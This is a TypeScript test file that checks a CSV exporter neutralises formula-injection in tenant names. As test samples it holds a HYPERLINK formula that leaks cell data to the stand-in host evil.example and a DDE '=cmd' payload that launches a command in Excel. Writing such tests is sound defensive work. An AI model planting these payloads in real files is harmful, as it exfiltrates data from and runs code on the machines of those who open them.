// A CSV cell that starts with a formula character is executed by the
// spreadsheet that opens it.
//
// Every value in IAMAI's CSVs is a tenant display name, sign-in address or
// department, and in a default Entra tenant any member can create a group and
// any guest sets their own display name. The exports go to an admin opening the
// recipient list in Excel to work a mail merge (audit redact-01,
// untrusted-content-rendering-01). Every lead character is checked, because a
// regex that covers four of six is the shape this bug takes.
import assert from 'node:assert/strict'
import test from 'node:test'
import { toCsv } from './format.ts'

const LEADS: { name: string; char: string }[] = [
  { name: 'equals', char: '=' },
  { name: 'plus', char: '+' },
  { name: 'minus', char: '-' },
  { name: 'at', char: '@' },
  { name: 'tab', char: '\t' },
  { name: 'carriage return', char: '\r' },
]

test('a cell beginning with any formula character is quoted as text, in every column', () => {
  for (const { name, char } of LEADS) {
    const payload = `${char}HYPERLINK("https://evil.example/?d="&A1,"ok")`
    const body = toCsv(['Name'], [[payload]]).split('\r\n')[1]
    // The apostrophe has to be the first character of the field. When the value
    // also needs RFC4180 quoting, that means immediately inside the quote.
    assert.ok(body.startsWith(`'${char}`) || body.startsWith(`"'${char}`), `${name} was not neutralised: ${JSON.stringify(body)}`)
  }
  assert.equal(toCsv(['A', 'B', 'C'], [['safe', '=1+1', '@SUM(A1)']]).split('\r\n')[1], `safe,'=1+1,'@SUM(A1)`)
  // The real attack shape from the audit: a group display name any tenant member can set, landing in recipients-*.csv.
  const csv = toCsv(['Name', 'Sign-in name', 'Department'], [['=cmd|\'/c calc\'!A1', 'a@b.example', 'Finance']])
  assert.ok(!csv.includes('\n=cmd'), 'the payload is still the first character of a cell')
  assert.ok(csv.includes(`'=cmd`), `not neutralised: ${csv}`)
})

test('ordinary values, a formula character mid-value, and RFC4180 quoting are left as they are', () => {
  assert.deepEqual(toCsv(['Name'], [['Priya Nair'], ['Sales — EMEA'], ['3 of 12'], [42], [null], [undefined]]).split('\r\n').slice(1), ['Priya Nair', 'Sales — EMEA', '3 of 12', '42', '', ''])
  // Only the leading position starts a formula; rewriting mid-string would corrupt "R&D - EMEA".
  assert.deepEqual(toCsv(['Name'], [['R&D - EMEA'], ['Q1=Q2 review']]).split('\r\n').slice(1), ['R&D - EMEA', 'Q1=Q2 review'])
  const rows = toCsv(['Name'], [['=a,b'], ['say "hi"'], ['two\nlines']]).split('\r\n')
  assert.equal(rows[1], `"'=a,b"`, rows[1])
  assert.equal(rows[2], `"say ""hi"""`, rows[2])
})
